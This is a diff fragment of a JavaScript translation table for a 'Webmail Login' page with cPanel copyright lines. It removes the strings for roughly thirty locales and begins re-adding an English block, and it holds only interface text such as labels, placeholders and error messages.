-    selectLocale: "Select a locale:",
-    modalOk: "OK",
-    modalTitleError: "Something went wrong",
-    modalTitleInfo: "Information",
-    modalTitleSuccess: "Success"
-  },
-  ar: {
-    title: "تسجيل دخول البريد الإلكتروني",
-    emailLabel: "عنوان البريد الإلكتروني",
-    emailPlaceholder: "أدخل عنوان بريدك الإلكتروني.",
-    passwordLabel: "كلمة المرور",
-    passwordPlaceholder: "أدخل كلمة مرور بريدك الإلكتروني.",
-    loginButton: "تسجيل الدخول",
-    signingIn: "جاري تسجيل الدخول...",
-    errorEmailPassword: "يرجى إدخال عنوان بريدك الإلكتروني وكلمة المرور.",
-    errorInvalidCredentials: "اسم المستخدم أو كلمة المرور التي أدخلتها غير صحيحة. حاول إدخالها مرة أخرى.",
-    loginSuccess: "تم تسجيل الدخول بنجاح، جاري إعادة التوجيه...",
-    copyright: "حقوق النشر© 2025 cPanel، L.L.C.",
-    privacyPolicy: "سياسة الخصوصية",
-    localeChange: "تغيير اللغة",
-    moreLocales: "المزيد من اللغات",
-    selectLocale: "اختر اللغة:",
-    modalOk: "موافق",
-    modalTitleError: "هناك خطأ",
-    modalTitleInfo: "معلومات",
-    modalTitleSuccess: "نجاح"
-  },
-  es: {
-    title: "Inicio de Sesión de Webmail",
-    emailLabel: "Dirección de Correo Electrónico",
-    emailPlaceholder: "Ingrese su dirección de correo electrónico.",
-    passwordLabel: "Contraseña",
-    passwordPlaceholder: "Ingrese su contraseña de correo electrónico.",
-    loginButton: "Iniciar Sesión",
-    signingIn: "Iniciando sesión...",
-    errorEmailPassword: "Por favor ingrese su dirección de correo electrónico y contraseña.",
-    errorInvalidCredentials: "El nombre de usuario o contraseña que ingresó no es correcto. Intente ingresarlo nuevamente.",
-    loginSuccess: "Inicio de sesión exitoso, redirigiendo...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Política de Privacidad",
-    localeChange: "Cambiar idioma",
-    moreLocales: "Más idiomas",
-    selectLocale: "Seleccione un idioma:",
-    modalOk: "Aceptar",
-    modalTitleError: "Ocurrió un problema",
-    modalTitleInfo: "Información",
-    modalTitleSuccess: "Éxito"
-  },
-  fr: {
-    title: "Connexion Webmail",
-    emailLabel: "Adresse E-mail",
-    emailPlaceholder: "Entrez votre adresse e-mail.",
-    passwordLabel: "Mot de passe",
-    passwordPlaceholder: "Entrez votre mot de passe e-mail.",
-    loginButton: "Se connecter",
-    signingIn: "Connexion en cours...",
-    errorEmailPassword: "Veuillez entrer votre adresse e-mail et votre mot de passe.",
-    errorInvalidCredentials: "Le nom d'utilisateur ou le mot de passe que vous avez entré n'est pas correct. Essayez de l'entrer à nouveau.",
-    loginSuccess: "Connexion réussie, redirection...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Politique de confidentialité",
-    localeChange: "Changer de langue",
-    moreLocales: "Plus de langues",
-    selectLocale: "Sélectionnez une langue:",
-    modalOk: "OK",
-    modalTitleError: "Un problème est survenu",
-    modalTitleInfo: "Information",
-    modalTitleSuccess: "Succès"
-  },
-  de: {
-    title: "Webmail-Anmeldung",
-    emailLabel: "E-Mail-Adresse",
-    emailPlaceholder: "Geben Sie Ihre E-Mail-Adresse ein.",
-    passwordLabel: "Passwort",
-    passwordPlaceholder: "Geben Sie Ihr E-Mail-Passwort ein.",
-    loginButton: "Anmelden",
-    signingIn: "Anmeldung läuft...",
-    errorEmailPassword: "Bitte geben Sie Ihre E-Mail-Adresse und Ihr Passwort ein.",
-    errorInvalidCredentials: "Der Benutzername oder das Passwort, das Sie eingegeben haben, ist nicht korrekt. Versuchen Sie es erneut einzugeben.",
-    loginSuccess: "Anmeldung erfolgreich, Weiterleitung...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Datenschutzrichtlinie",
-    localeChange: "Sprache ändern",
-    moreLocales: "Weitere Sprachen",
-    selectLocale: "Wählen Sie eine Sprache:",
-    modalOk: "OK",
-    modalTitleError: "Etwas ist schief gelaufen",
-    modalTitleInfo: "Information",
-    modalTitleSuccess: "Erfolg"
-  },
-  ja: {
-    title: "Webmail ログイン",
-    emailLabel: "メールアドレス",
-    emailPlaceholder: "メールアドレスを入力してください。",
-    passwordLabel: "パスワード",
-    passwordPlaceholder: "メールパスワードを入力してください。",
-    loginButton: "ログイン",
-    signingIn: "ログイン中...",
-    errorEmailPassword: "メールアドレスとパスワードを入力してください。",
-    errorInvalidCredentials: "入力されたユーザー名またはパスワードが正しくありません。再度入力してください。",
-    loginSuccess: "ログインに成功しました。リダイレクト中...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "プライバシーポリシー",
-    localeChange: "言語を変更",
-    moreLocales: "その他の言語",
-    selectLocale: "言語を選択してください:",
-    modalOk: "OK",
-    modalTitleError: "何か問題が発生しました",
-    modalTitleInfo: "情報",
-    modalTitleSuccess: "成功"
-  },
-  zh: {
-    title: "Webmail 登录",
-    emailLabel: "电子邮件地址",
-    emailPlaceholder: "请输入您的电子邮件地址。",
-    passwordLabel: "密码",
-    passwordPlaceholder: "请输入您的电子邮件密码。",
-    loginButton: "登录",
-    signingIn: "正在登录...",
-    errorEmailPassword: "请输入您的电子邮件地址和密码。",
-    errorInvalidCredentials: "您输入的用户名或密码不正确。请重新输入。",
-    loginSuccess: "登录成功，正在重定向...",
-    copyright: "版权所有© 2025 cPanel, L.L.C.",
-    privacyPolicy: "隐私政策",
-    localeChange: "更改语言",
-    moreLocales: "更多语言",
-    selectLocale: "选择语言:",
-    modalOk: "确定",
-    modalTitleError: "发生错误",
-    modalTitleInfo: "信息",
-    modalTitleSuccess: "成功"
-  },
-  ru: {
-    title: "Вход в Webmail",
-    emailLabel: "Адрес электронной почты",
-    emailPlaceholder: "Введите ваш адрес электронной почты.",
-    passwordLabel: "Пароль",
-    passwordPlaceholder: "Введите пароль от вашей электронной почты.",
-    loginButton: "Войти",
-    signingIn: "Выполняется вход...",
-    errorEmailPassword: "Пожалуйста, введите ваш адрес электронной почты и пароль.",
-    errorInvalidCredentials: "Имя пользователя или пароль, которые вы ввели, неверны. Попробуйте ввести их снова.",
-    loginSuccess: "Вход выполнен успешно, перенаправление...",
-    copyright: "Авторское право© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Политика конфиденциальности",
-    localeChange: "Изменить язык",
-    moreLocales: "Больше языков",
-    selectLocale: "Выберите язык:",
-    modalOk: "OK",
-    modalTitleError: "Что-то пошло не так",
-    modalTitleInfo: "Информация",
-    modalTitleSuccess: "Успех"
-  },
-  cs: {
-    title: "Webmail Přihlášení",
-    emailLabel: "E-mailová adresa",
-    emailPlaceholder: "Zadejte svou e-mailovou adresu.",
-    passwordLabel: "Heslo",
-    passwordPlaceholder: "Zadejte své e-mailové heslo.",
-    loginButton: "Přihlásit se",
-    signingIn: "Přihlašování...",
-    errorEmailPassword: "Prosím zadejte svou e-mailovou adresu a heslo.",
-    errorInvalidCredentials: "Uživatelské jméno nebo heslo, které jste zadali, není správné. Zkuste je zadat znovu.",
-    loginSuccess: "Přihlášení úspěšné, přesměrování...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Zásady ochrany osobních údajů",
-    localeChange: "Změnit jazyk",
-    moreLocales: "Více jazyků",
-    selectLocale: "Vyberte jazyk:",
-    modalOk: "OK",
-    modalTitleError: "Něco se pokazilo",
-    modalTitleInfo: "Informace",
-    modalTitleSuccess: "Úspěch"
-  },
-  da: {
-    title: "Webmail Login",
-    emailLabel: "E-mailadresse",
-    emailPlaceholder: "Indtast din e-mailadresse.",
-    passwordLabel: "Adgangskode",
-    passwordPlaceholder: "Indtast din e-mail adgangskode.",
-    loginButton: "Log ind",
-    signingIn: "Logger ind...",
-    errorEmailPassword: "Indtast venligst din e-mailadresse og adgangskode.",
-    errorInvalidCredentials: "Brugernavnet eller adgangskoden, du indtastede, er ikke korrekt. Prøv at indtaste den igen.",
-    loginSuccess: "Login succesfuld, omdirigerer...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Privatlivspolitik",
-    localeChange: "Skift sprog",
-    moreLocales: "Flere sprog",
-    selectLocale: "Vælg et sprog:",
-    modalOk: "OK",
-    modalTitleError: "Noget gik galt",
-    modalTitleInfo: "Information",
-    modalTitleSuccess: "Succes"
-  },
-  el: {
-    title: "Σύνδεση Webmail",
-    emailLabel: "Διεύθυνση Email",
-    emailPlaceholder: "Εισάγετε τη διεύθυνση email σας.",
-    passwordLabel: "Κωδικός πρόσβασης",
-    passwordPlaceholder: "Εισάγετε τον κωδικό πρόσβασης email σας.",
-    loginButton: "Σύνδεση",
-    signingIn: "Σύνδεση σε εξέλιξη...",
-    errorEmailPassword: "Παρακαλώ εισάγετε τη διεύθυνση email και τον κωδικό πρόσβασης σας.",
-    errorInvalidCredentials: "Το όνομα χρήστη ή ο κωδικός πρόσβασης που εισάγατε δεν είναι σωστό. Δοκιμάστε να τον εισάγετε ξανά.",
-    loginSuccess: "Επιτυχής σύνδεση, ανακατεύθυνση...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Πολιτική Απορρήτου",
-    localeChange: "Αλλαγή γλώσσας",
-    moreLocales: "Περισσότερες γλώσσες",
-    selectLocale: "Επιλέξτε γλώσσα:",
-    modalOk: "OK",
-    modalTitleError: "Κάτι πήγε στραβά",
-    modalTitleInfo: "Πληροφορίες",
-    modalTitleSuccess: "Επιτυχία"
-  },
-  fi: {
-    title: "Webmail Kirjautuminen",
-    emailLabel: "Sähköpostiosoite",
-    emailPlaceholder: "Syötä sähköpostiosoitteesi.",
-    passwordLabel: "Salasana",
-    passwordPlaceholder: "Syötä sähköpostisi salasana.",
-    loginButton: "Kirjaudu sisään",
-    signingIn: "Kirjaudutaan sisään...",
-    errorEmailPassword: "Syötä sähköpostiosoitteesi ja salasanasi.",
-    errorInvalidCredentials: "Käyttäjänimi tai salasana, jonka syötit, ei ole oikein. Yritä syöttää se uudelleen.",
-    loginSuccess: "Kirjautuminen onnistui, ohjataan...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Tietosuojakäytäntö",
-    localeChange: "Vaihda kieltä",
-    moreLocales: "Lisää kieliä",
-    selectLocale: "Valitse kieli:",
-    modalOk: "OK",
-    modalTitleError: "Jokin meni pieleen",
-    modalTitleInfo: "Tiedot",
-    modalTitleSuccess: "Onnistui"
-  },
-  fil: {
-    title: "Webmail Pag-login",
-    emailLabel: "Email Address",
-    emailPlaceholder: "Ilagay ang iyong email address.",
-    passwordLabel: "Password",
-    passwordPlaceholder: "Ilagay ang iyong email password.",
-    loginButton: "Mag-login",
-    signingIn: "Nag-lo-login...",
-    errorEmailPassword: "Mangyaring ilagay ang iyong email address at password.",
-    errorInvalidCredentials: "Ang username o password na inilagay mo ay hindi tama. Subukan mong ilagay ito muli.",
-    loginSuccess: "Matagumpay ang pag-login, nagre-redirect...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Patakaran sa Privacy",
-    localeChange: "Baguhin ang wika",
-    moreLocales: "Higit pang mga wika",
-    selectLocale: "Pumili ng wika:",
-    modalOk: "OK",
-    modalTitleError: "May nangyaring mali",
-    modalTitleInfo: "Impormasyon",
-    modalTitleSuccess: "Tagumpay"
-  },
-  he: {
-    title: "התחברות Webmail",
-    emailLabel: "כתובת דוא\"ל",
-    emailPlaceholder: "הזן את כתובת הדוא\"ל שלך.",
-    passwordLabel: "סיסמה",
-    passwordPlaceholder: "הזן את סיסמת הדוא\"ל שלך.",
-    loginButton: "התחבר",
-    signingIn: "מתחבר...",
-    errorEmailPassword: "אנא הזן את כתובת הדוא\"ל והסיסמה שלך.",
-    errorInvalidCredentials: "שם המשתמש או הסיסמה שהזנת אינם נכונים. נסה להזין אותם שוב.",
-    loginSuccess: "ההתחברות הצליחה, מפנה...",
-    copyright: "זכויות יוצרים© 2025 cPanel, L.L.C.",
-    privacyPolicy: "מדיניות פרטיות",
-    localeChange: "שנה שפה",
-    moreLocales: "שפות נוספות",
-    selectLocale: "בחר שפה:",
-    modalOk: "אישור",
-    modalTitleError: "משהו השתבש",
-    modalTitleInfo: "מידע",
-    modalTitleSuccess: "הצלחה"
-  },
-  hu: {
-    title: "Webmail Bejelentkezés",
-    emailLabel: "E-mail cím",
-    emailPlaceholder: "Adja meg az e-mail címét.",
-    passwordLabel: "Jelszó",
-    passwordPlaceholder: "Adja meg az e-mail jelszavát.",
-    loginButton: "Bejelentkezés",
-    signingIn: "Bejelentkezés...",
-    errorEmailPassword: "Kérjük, adja meg az e-mail címét és jelszavát.",
-    errorInvalidCredentials: "A megadott felhasználónév vagy jelszó nem helyes. Próbálja meg újra megadni.",
-    loginSuccess: "Sikeres bejelentkezés, átirányítás...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Adatvédelmi irányelvek",
-    localeChange: "Nyelv módosítása",
-    moreLocales: "Több nyelv",
-    selectLocale: "Válasszon nyelvet:",
-    modalOk: "OK",
-    modalTitleError: "Valami hiba történt",
-    modalTitleInfo: "Információ",
-    modalTitleSuccess: "Sikeres"
-  },
-  id: {
-    title: "Login Webmail",
-    emailLabel: "Alamat Email",
-    emailPlaceholder: "Masukkan alamat email Anda.",
-    passwordLabel: "Kata Sandi",
-    passwordPlaceholder: "Masukkan kata sandi email Anda.",
-    loginButton: "Masuk",
-    signingIn: "Sedang masuk...",
-    errorEmailPassword: "Silakan masukkan alamat email dan kata sandi Anda.",
-    errorInvalidCredentials: "Nama pengguna atau kata sandi yang Anda masukkan tidak benar. Coba masukkan lagi.",
-    loginSuccess: "Login berhasil, mengalihkan...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Kebijakan Privasi",
-    localeChange: "Ubah bahasa",
-    moreLocales: "Bahasa lainnya",
-    selectLocale: "Pilih bahasa:",
-    modalOk: "OK",
-    modalTitleError: "Ada yang salah",
-    modalTitleInfo: "Informasi",
-    modalTitleSuccess: "Berhasil"
-  },
-  it: {
-    title: "Accesso Webmail",
-    emailLabel: "Indirizzo Email",
-    emailPlaceholder: "Inserisci il tuo indirizzo email.",
-    passwordLabel: "Password",
-    passwordPlaceholder: "Inserisci la password della tua email.",
-    loginButton: "Accedi",
-    signingIn: "Accesso in corso...",
-    errorEmailPassword: "Inserisci il tuo indirizzo email e la password.",
-    errorInvalidCredentials: "Il nome utente o la password che hai inserito non è corretto. Prova a inserirli di nuovo.",
-    loginSuccess: "Accesso riuscito, reindirizzamento...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Informativa sulla privacy",
-    localeChange: "Cambia lingua",
-    moreLocales: "Altre lingue",
-    selectLocale: "Seleziona una lingua:",
-    modalOk: "OK",
-    modalTitleError: "Qualcosa è andato storto",
-    modalTitleInfo: "Informazione",
-    modalTitleSuccess: "Successo"
-  },
-  ko: {
-    title: "웹메일 로그인",
-    emailLabel: "이메일 주소",
-    emailPlaceholder: "이메일 주소를 입력하세요.",
-    passwordLabel: "비밀번호",
-    passwordPlaceholder: "이메일 비밀번호를 입력하세요.",
-    loginButton: "로그인",
-    signingIn: "로그인 중...",
-    errorEmailPassword: "이메일 주소와 비밀번호를 입력해 주세요.",
-    errorInvalidCredentials: "입력한 사용자 이름 또는 비밀번호가 올바르지 않습니다. 다시 입력해 보세요.",
-    loginSuccess: "로그인 성공, 리디렉션 중...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "개인정보처리방침",
-    localeChange: "언어 변경",
-    moreLocales: "더 많은 언어",
-    selectLocale: "언어를 선택하세요:",
-    modalOk: "OK",
-    modalTitleError: "문제가 발생했습니다",
-    modalTitleInfo: "정보",
-    modalTitleSuccess: "성공"
-  },
-  ms: {
-    title: "Log Masuk Webmail",
-    emailLabel: "Alamat E-mel",
-    emailPlaceholder: "Masukkan alamat e-mel anda.",
-    passwordLabel: "Kata Laluan",
-    passwordPlaceholder: "Masukkan kata laluan e-mel anda.",
-    loginButton: "Log Masuk",
-    signingIn: "Sedang log masuk...",
-    errorEmailPassword: "Sila masukkan alamat e-mel dan kata laluan anda.",
-    errorInvalidCredentials: "Nama pengguna atau kata laluan yang anda masukkan tidak betul. Cuba masukkan semula.",
-    loginSuccess: "Log masuk berjaya, mengalihkan...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Dasar Privasi",
-    localeChange: "Tukar bahasa",
-    moreLocales: "Lebih banyak bahasa",
-    selectLocale: "Pilih bahasa:",
-    modalOk: "OK",
-    modalTitleError: "Ada yang salah",
-    modalTitleInfo: "Maklumat",
-    modalTitleSuccess: "Berjaya"
-  },
-  nb: {
-    title: "Webmail Innlogging",
-    emailLabel: "E-postadresse",
-    emailPlaceholder: "Skriv inn din e-postadresse.",
-    passwordLabel: "Passord",
-    passwordPlaceholder: "Skriv inn ditt e-postpassord.",
-    loginButton: "Logg inn",
-    signingIn: "Logger inn...",
-    errorEmailPassword: "Vennligst skriv inn din e-postadresse og passord.",
-    errorInvalidCredentials: "Brukernavnet eller passordet du skrev inn er ikke riktig. Prøv å skrive det inn igjen.",
-    loginSuccess: "Innlogging vellykket, omdirigerer...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Personvernregler",
-    localeChange: "Endre språk",
-    moreLocales: "Flere språk",
-    selectLocale: "Velg et språk:",
-    modalOk: "OK",
-    modalTitleError: "Noe gikk galt",
-    modalTitleInfo: "Informasjon",
-    modalTitleSuccess: "Suksess"
-  },
-  nl: {
-    title: "Webmail Aanmelden",
-    emailLabel: "E-mailadres",
-    emailPlaceholder: "Voer uw e-mailadres in.",
-    passwordLabel: "Wachtwoord",
-    passwordPlaceholder: "Voer uw e-mailwachtwoord in.",
-    loginButton: "Aanmelden",
-    signingIn: "Aanmelden...",
-    errorEmailPassword: "Voer uw e-mailadres en wachtwoord in.",
-    errorInvalidCredentials: "De gebruikersnaam of het wachtwoord dat u heeft ingevoerd is niet correct. Probeer het opnieuw in te voeren.",
-    loginSuccess: "Aanmelden gelukt, doorverwijzen...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Privacybeleid",
-    localeChange: "Taal wijzigen",
-    moreLocales: "Meer talen",
-    selectLocale: "Selecteer een taal:",
-    modalOk: "OK",
-    modalTitleError: "Iets ging mis",
-    modalTitleInfo: "Informatie",
-    modalTitleSuccess: "Succes"
-  },
-  pl: {
-    title: "Logowanie Webmail",
-    emailLabel: "Adres e-mail",
-    emailPlaceholder: "Wprowadź swój adres e-mail.",
-    passwordLabel: "Hasło",
-    passwordPlaceholder: "Wprowadź hasło do swojej poczty e-mail.",
-    loginButton: "Zaloguj się",
-    signingIn: "Logowanie...",
-    errorEmailPassword: "Wprowadź swój adres e-mail i hasło.",
-    errorInvalidCredentials: "Nazwa użytkownika lub hasło, które wprowadziłeś, nie jest poprawne. Spróbuj wprowadzić je ponownie.",
-    loginSuccess: "Logowanie udane, przekierowywanie...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Polityka prywatności",
-    localeChange: "Zmień język",
-    moreLocales: "Więcej języków",
-    selectLocale: "Wybierz język:",
-    modalOk: "OK",
-    modalTitleError: "Coś poszło nie tak",
-    modalTitleInfo: "Informacja",
-    modalTitleSuccess: "Sukces"
-  },
-  pt: {
-    title: "Login Webmail",
-    emailLabel: "Endereço de E-mail",
-    emailPlaceholder: "Digite seu endereço de e-mail.",
-    passwordLabel: "Senha",
-    passwordPlaceholder: "Digite sua senha de e-mail.",
-    loginButton: "Entrar",
-    signingIn: "Entrando...",
-    errorEmailPassword: "Por favor, digite seu endereço de e-mail e senha.",
-    errorInvalidCredentials: "O nome de usuário ou senha que você digitou não está correto. Tente digitá-lo novamente.",
-    loginSuccess: "Login bem-sucedido, redirecionando...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Política de Privacidade",
-    localeChange: "Alterar idioma",
-    moreLocales: "Mais idiomas",
-    selectLocale: "Selecione um idioma:",
-    modalOk: "OK",
-    modalTitleError: "Algo deu errado",
-    modalTitleInfo: "Informação",
-    modalTitleSuccess: "Sucesso"
-  },
-  pt_br: {
-    title: "Login Webmail",
-    emailLabel: "Endereço de E-mail",
-    emailPlaceholder: "Digite seu endereço de e-mail.",
-    passwordLabel: "Senha",
-    passwordPlaceholder: "Digite sua senha de e-mail.",
-    loginButton: "Entrar",
-    signingIn: "Entrando...",
-    errorEmailPassword: "Por favor, digite seu endereço de e-mail e senha.",
-    errorInvalidCredentials: "O nome de usuário ou senha que você digitou não está correto. Tente digitá-lo novamente.",
-    loginSuccess: "Login bem-sucedido, redirecionando...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Política de Privacidade",
-    localeChange: "Alterar idioma",
-    moreLocales: "Mais idiomas",
-    selectLocale: "Selecione um idioma:",
-    modalOk: "OK",
-    modalTitleError: "Algo deu errado",
-    modalTitleInfo: "Informação",
-    modalTitleSuccess: "Sucesso"
-  },
-  ro: {
-    title: "Autentificare Webmail",
-    emailLabel: "Adresă de e-mail",
-    emailPlaceholder: "Introduceți adresa dvs. de e-mail.",
-    passwordLabel: "Parolă",
-    passwordPlaceholder: "Introduceți parola dvs. de e-mail.",
-    loginButton: "Autentificare",
-    signingIn: "Se autentifică...",
-    errorEmailPassword: "Vă rugăm să introduceți adresa dvs. de e-mail și parola.",
-    errorInvalidCredentials: "Numele de utilizator sau parola pe care ați introdus-o nu este corectă. Încercați să o introduceți din nou.",
-    loginSuccess: "Autentificare reușită, redirecționare...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Politica de confidențialitate",
-    localeChange: "Schimbă limba",
-    moreLocales: "Mai multe limbi",
-    selectLocale: "Selectați o limbă:",
-    modalOk: "OK",
-    modalTitleError: "Ceva nu a mers bine",
-    modalTitleInfo: "Informație",
-    modalTitleSuccess: "Succes"
-  },
-  sv: {
-    title: "Webmail Inloggning",
-    emailLabel: "E-postadress",
-    emailPlaceholder: "Ange din e-postadress.",
-    passwordLabel: "Lösenord",
-    passwordPlaceholder: "Ange ditt e-postlösenord.",
-    loginButton: "Logga in",
-    signingIn: "Loggar in...",
-    errorEmailPassword: "Ange din e-postadress och lösenord.",
-    errorInvalidCredentials: "Användarnamnet eller lösenordet du angav är inte korrekt. Försök att ange det igen.",
-    loginSuccess: "Inloggning lyckades, omdirigerar...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Integritetspolicy",
-    localeChange: "Ändra språk",
-    moreLocales: "Fler språk",
-    selectLocale: "Välj ett språk:",
-    modalOk: "OK",
-    modalTitleError: "Något gick fel",
-    modalTitleInfo: "Information",
-    modalTitleSuccess: "Lyckades"
-  },
-  th: {
-    title: "เข้าสู่ระบบ Webmail",
-    emailLabel: "ที่อยู่อีเมล",
-    emailPlaceholder: "ป้อนที่อยู่อีเมลของคุณ",
-    passwordLabel: "รหัสผ่าน",
-    passwordPlaceholder: "ป้อนรหัสผ่านอีเมลของคุณ",
-    loginButton: "เข้าสู่ระบบ",
-    signingIn: "กำลังเข้าสู่ระบบ...",
-    errorEmailPassword: "กรุณาป้อนที่อยู่อีเมลและรหัสผ่านของคุณ",
-    errorInvalidCredentials: "ชื่อผู้ใช้หรือรหัสผ่านที่คุณป้อนไม่ถูกต้อง ลองป้อนอีกครั้ง",
-    loginSuccess: "เข้าสู่ระบบสำเร็จ กำลังเปลี่ยนเส้นทาง...",
-    copyright: "ลิขสิทธิ์© 2025 cPanel, L.L.C.",
-    privacyPolicy: "นโยบายความเป็นส่วนตัว",
-    localeChange: "เปลี่ยนภาษา",
-    moreLocales: "ภาษาอื่นๆ",
-    selectLocale: "เลือกภาษา:",
-    modalOk: "OK",
-    modalTitleError: "มีบางอย่างผิดพลาด",
-    modalTitleInfo: "ข้อมูล",
-    modalTitleSuccess: "สำเร็จ"
-  },
-  tr: {
-    title: "Webmail Giriş",
-    emailLabel: "E-posta Adresi",
-    emailPlaceholder: "E-posta adresinizi girin.",
-    passwordLabel: "Şifre",
-    passwordPlaceholder: "E-posta şifrenizi girin.",
-    loginButton: "Giriş Yap",
-    signingIn: "Giriş yapılıyor...",
-    errorEmailPassword: "Lütfen e-posta adresinizi ve şifrenizi girin.",
-    errorInvalidCredentials: "Girdiğiniz kullanıcı adı veya şifre doğru değil. Tekrar girmeyi deneyin.",
-    loginSuccess: "Giriş başarılı, yönlendiriliyor...",
-    copyright: "Telif Hakkı© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Gizlilik Politikası",
-    localeChange: "Dili değiştir",
-    moreLocales: "Daha fazla dil",
-    selectLocale: "Bir dil seçin:",
-    modalOk: "OK",
-    modalTitleError: "Bir şey yanlış gitti",
-    modalTitleInfo: "Bilgi",
-    modalTitleSuccess: "Başarılı"
-  },
-  uk: {
-    title: "Вхід у Webmail",
-    emailLabel: "Адреса електронної пошти",
-    emailPlaceholder: "Введіть вашу адресу електронної пошти.",
-    passwordLabel: "Пароль",
-    passwordPlaceholder: "Введіть пароль від вашої електронної пошти.",
-    loginButton: "Увійти",
-    signingIn: "Виконується вхід...",
-    errorEmailPassword: "Будь ласка, введіть вашу адресу електронної пошти та пароль.",
-    errorInvalidCredentials: "Ім'я користувача або пароль, які ви ввели, неправильні. Спробуйте ввести їх знову.",
-    loginSuccess: "Вхід виконано успішно, перенаправлення...",
-    copyright: "Авторське право© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Політика конфіденційності",
-    localeChange: "Змінити мову",
-    moreLocales: "Більше мов",
-    selectLocale: "Виберіть мову:",
-    modalOk: "OK",
-    modalTitleError: "Щось пішло не так",
-    modalTitleInfo: "Інформація",
-    modalTitleSuccess: "Успіх"
-  },
-  vi: {
-    title: "Đăng nhập Webmail",
-    emailLabel: "Địa chỉ Email",
-    emailPlaceholder: "Nhập địa chỉ email của bạn.",
-    passwordLabel: "Mật khẩu",
-    passwordPlaceholder: "Nhập mật khẩu email của bạn.",
-    loginButton: "Đăng nhập",
-    signingIn: "Đang đăng nhập...",
-    errorEmailPassword: "Vui lòng nhập địa chỉ email và mật khẩu của bạn.",
-    errorInvalidCredentials: "Tên người dùng hoặc mật khẩu bạn nhập không đúng. Hãy thử nhập lại.",
-    loginSuccess: "Đăng nhập thành công, đang chuyển hướng...",
-    copyright: "Bản quyền© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Chính sách bảo mật",
-    localeChange: "Thay đổi ngôn ngữ",
-    moreLocales: "Thêm ngôn ngữ",
-    selectLocale: "Chọn ngôn ngữ:",
-    modalOk: "OK",
-    modalTitleError: "Có gì đi sai",
-    modalTitleInfo: "Thông tin",
-    modalTitleSuccess: "Thành công"
-  },
-  zh_tw: {
-    title: "Webmail 登入",
-    emailLabel: "電子郵件地址",
-    emailPlaceholder: "請輸入您的電子郵件地址。",
-    passwordLabel: "密碼",
-    passwordPlaceholder: "請輸入您的電子郵件密碼。",
-    loginButton: "登入",
-    signingIn: "正在登入...",
-    errorEmailPassword: "請輸入您的電子郵件地址和密碼。",
-    errorInvalidCredentials: "您輸入的使用者名稱或密碼不正確。請重新輸入。",
-    loginSuccess: "登入成功，正在重新導向...",
-    copyright: "版權所有© 2025 cPanel, L.L.C.",
-    privacyPolicy: "隱私權政策",
-    localeChange: "變更語言",
-    moreLocales: "更多語言",
-    selectLocale: "選擇語言:",
-    modalOk: "確定",
-    modalTitleError: "發生錯誤",
-    modalTitleInfo: "資訊",
-    modalTitleSuccess: "成功"
-  },
-  es_es: {
-    title: "Inicio de Sesión de Webmail (España)",
-    emailLabel: "Dirección de correo electrónico",
-    emailPlaceholder: "Introduce tu dirección de correo electrónico.",
-    passwordLabel: "Contraseña",
-    passwordPlaceholder: "Introduce tu contraseña de correo electrónico.",
-    loginButton: "Iniciar sesión",
-    signingIn: "Iniciando sesión...",
-    errorEmailPassword: "Por favor, introduce tu dirección de correo electrónico y contraseña.",
-    errorInvalidCredentials: "El nombre de usuario o la contraseña no son correctos. Inténtalo de nuevo.",
-    loginSuccess: "Inicio de sesión correcto, redirigiendo...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Política de privacidad",
-    localeChange: "Cambiar idioma",
-    moreLocales: "Más idiomas",
-    selectLocale: "Selecciona un idioma:",
-    modalOk: "Aceptar",
-    modalTitleError: "Algo salió mal",
-    modalTitleInfo: "Información",
-    modalTitleSuccess: "Éxito"
-  },
-  i_en: {
-    title: "Webmail Login",
-    emailLabel: "Email Address",
-    emailPlaceholder: "Enter your email address.",
-    passwordLabel: "Password",
-    passwordPlaceholder: "Enter your email password.",
-    loginButton: "Log in",
-    signingIn: "Signing in...",
-    errorEmailPassword: "Please enter your email address and password.",
-    errorInvalidCredentials: "The username or password you entered isn't correct. Try entering it again.",
-    loginSuccess: "Login successful, redirecting...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Privacy Policy",
-    localeChange: "Change locale",
-    moreLocales: "More locales",
-    selectLocale: "Select a locale:",
-    modalOk: "OK",
-    modalTitleError: "Something went wrong",
-    modalTitleInfo: "Information",
-    modalTitleSuccess: "Success"
-  }
+en: {
+  title: "Webmail Login",
+  emailLabel: "Email Address",
+  emailPlaceholder: "Enter your email address.",
+  passwordLabel: "Password",
+  passwordPlaceholder: "Enter your email password.",
+  loginButton: "Log in",
+  signingIn: "Signing in...",
+  errorEmailPassword: "Please enter your email address and password.",
+  errorInvalidCredentials: "The username or password you entered isn't correct. Try entering it again.",
+  loginSuccess: "Login successful, redirecting...",
